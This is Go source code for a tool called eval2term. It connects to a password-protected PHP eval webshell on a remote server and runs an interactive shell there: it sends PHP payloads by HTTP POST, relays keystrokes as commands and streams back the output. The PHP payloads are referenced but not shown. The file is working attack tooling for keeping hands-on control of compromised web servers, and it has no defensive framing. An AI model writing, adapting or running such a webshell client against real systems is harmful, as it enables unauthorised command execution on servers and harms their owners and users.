// @author:蚁逅
// https://weibo.com/antoor
// 2022.09.08
package main

import (
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"github.com/eiannone/keyboard"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"time"
)

// 命令行参数
var (
	Url string
	Pwd string
)

// 程序初始化
func init() {
	flag.StringVar(&Url, "url", "", "eval - webshell url")
	flag.StringVar(&Pwd, "pwd", "", "webshell passwd")
}

// http post函数
func httpPost(link string, code string) (string, error) {
	res, err := http.PostForm(link, url.Values{Pwd: {code}})
	if err != nil {
		return "", err
	}
	defer res.Body.Close()
	if res.StatusCode == 500 {
		return "", errors.New("500")
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

// 程序入口
func main() {
	flag.Parse()
	fmt.Println(`
	╔═╗╦  ╦╔═╗╦    ╔╦╗╔═╗╦═╗╔╦╗
	║╣ ╚╗╔╝╠═╣║     ║ ║╣ ╠╦╝║║║
	╚═╝ ╚╝ ╩ ╩╩═╝   ╩ ╚═╝╩╚═╩ ╩
	----------------------------
[❤ https://github.com/she11way/eval2term ❤]
               @Antoor
               =======`)
	if len(Url) == 0 || len(Pwd) == 0 {
		fmt.Println("[?] Usage:\n\t./eval2term -url http://host/sw.php -pwd sw")
		return
	}
	fmt.Println("[*] connect to:", Url)
	fmt.Println("[-] Start shell..")
	// 先关闭，在开启
	// 如果有多个.sw_in* 文件，则不需要关闭
	httpPost(Url, PostData(PhpCode.stop))
	go httpPost(Url, PostData(PhpCode.start))
	time.Sleep(time.Second * 2)

	// 读取输出
	go func() {
		for {
			data, err := httpPost(Url, PostData(PhpCode.read))
			if err != nil && err.Error() == "500" {
				fmt.Println("[!] Close term.")
				httpPost(Url, PostData(PhpCode.stop))
				os.Exit(0)
			} else if err != nil {
				fmt.Println("[!] err:", err.Error())
			}
			fmt.Print(data)
			time.Sleep(time.Second)
		}
	}()

	// 监听用户输入，发送
	if err := keyboard.Open(); err != nil {
		panic(err)
	}
	defer keyboard.Close()
	var cmdCache string

	go func() {
		for {
			// 如果没有输入数据，则延时1秒后再检测
			if len(cmdCache) == 0 {
				time.Sleep(time.Second)
				continue
			}
			httpPost(fmt.Sprintf("%s?c=%s", Url, cmdCache), PostData(PhpCode.write))
			cmdCache = ""
			// 2秒发送一次
			time.Sleep(time.Second * 2)
		}
	}()

	for {
		char, key, err := keyboard.GetKey()
		if err != nil {
			panic(err)
		}
		// 输入ctrl+D 退出程序
		if key == 0x04 {
			break
		}

		var c string
		if char == 0x00 && key != 0x00 {
			c = fmt.Sprintf("%02x", key)
		} else if char != 0x00 {
			c = fmt.Sprintf("%02x", char)
		}

		// TODO: 修复方向键
		/*
			switch key {
			case keyboard.KeyArrowLeft:
				c = fmt.Sprintf("%02x", 0x37)
			case keyboard.KeyArrowUp:
				c = fmt.Sprintf("%02x", 0x38)
			case keyboard.KeyArrowRight:
				c = fmt.Sprintf("%02x", 0x39)
			case keyboard.KeyArrowDown:
				c = fmt.Sprintf("%02x", 0x40)
			}
		*/

		t, _ := hex.DecodeString(c)
		cmdCache += url.QueryEscape(string(t))
	}

	fmt.Println("[!] Stop server..")
	httpPost(Url, PostData(PhpCode.stop))
}
